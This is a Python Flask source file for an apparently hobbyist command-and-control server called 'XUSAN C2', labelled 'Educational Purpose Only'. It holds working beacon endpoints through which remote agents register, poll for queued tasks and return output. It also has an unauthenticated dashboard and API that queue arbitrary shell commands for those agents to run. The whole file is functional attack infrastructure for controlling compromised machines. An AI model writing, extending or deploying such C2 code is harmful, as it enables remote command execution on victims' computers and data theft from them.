#!/usr/bin/env python3
"""
🎯 XUSAN C2 - Web Dashboard
Educational Purpose Only
"""

from flask import Flask, render_template, request, jsonify, redirect, url_for
from datetime import datetime
import threading
import uuid
import os

app = Flask(__name__)
app.secret_key = 'xusan_secret_key'

# ==================== DATA STORAGE ====================
sessions = {}
task_queue = {}
results = {}

# ==================== BEACON API ====================

@app.route('/api/beacon/register', methods=['POST'])
def register_beacon():
    """Agent registration"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id', str(uuid.uuid4())[:8])
        agent_info = data.get('info', {})
        
        sessions[agent_id] = {
            'id': agent_id,
            'info': agent_info,
            'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'status': 'active'
        }
        task_queue[agent_id] = []
        results[agent_id] = []
        
        print(f"[+] New agent: {agent_id} - {agent_info.get('hostname', 'Unknown')}")
        
        return jsonify({'status': 'ok', 'agent_id': agent_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 400


@app.route('/api/beacon/heartbeat', methods=['POST'])
def heartbeat():
    """Agent heartbeat - return pending tasks"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        
        if agent_id in sessions:
            sessions[agent_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            sessions[agent_id]['status'] = 'active'
        
        # Get pending tasks
        tasks = task_queue.get(agent_id, [])
        task_queue[agent_id] = []  # Clear queue
        
        return jsonify({'status': 'ok', 'tasks': tasks})
    except Exception as e:
        return jsonify({'error': str(e)}), 400


@app.route('/api/beacon/result', methods=['POST'])
def task_result():
    """Receive task results"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        task_id = data.get('task_id')
        result = data.get('result', '')
        
        if agent_id not in results:
            results[agent_id] = []
        
        results[agent_id].append({
            'task_id': task_id,
            'result': result,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        
        print(f"[+] Result from {agent_id}: {result[:50]}...")
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 400


# ==================== WEB DASHBOARD ====================

@app.route('/')
def dashboard():
    """Main dashboard"""
    return render_template('dashboard.html', sessions=sessions)


@app.route('/session/<agent_id>')
def session_detail(agent_id):
    """Session detail page"""
    session = sessions.get(agent_id)
    if not session:
        return redirect(url_for('dashboard'))
    
    agent_results = results.get(agent_id, [])
    return render_template('session.html', session=session, results=agent_results)


@app.route('/api/sessions')
def api_sessions():
    """API: Get all sessions"""
    return jsonify(list(sessions.values()))


@app.route('/api/task', methods=['POST'])
def add_task():
    """API: Add task for agent"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        command = data.get('command', '')
        
        if agent_id not in task_queue:
            task_queue[agent_id] = []
        
        task = {
            'task_id': str(uuid.uuid4())[:8],
            'type': 'shell',
            'data': command
        }
        task_queue[agent_id].append(task)
        
        return jsonify({'status': 'ok', 'task_id': task['task_id']})
    except Exception as e:
        return jsonify({'error': str(e)}), 400


@app.route('/api/results/<agent_id>')
def get_results(agent_id):
    """API: Get results for agent"""
    return jsonify(results.get(agent_id, []))


# ==================== MAIN ====================

if __name__ == '__main__':
    print("""
╔═══════════════════════════════════════════════════════════╗
║         XUSAN C2 - WEB DASHBOARD                          ║
║         http://127.0.0.1:5000                             ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Create templates folder if not exists
    os.makedirs('templates', exist_ok=True)
    
    app.run(host='0.0.0.0', port=5000, debug=False)
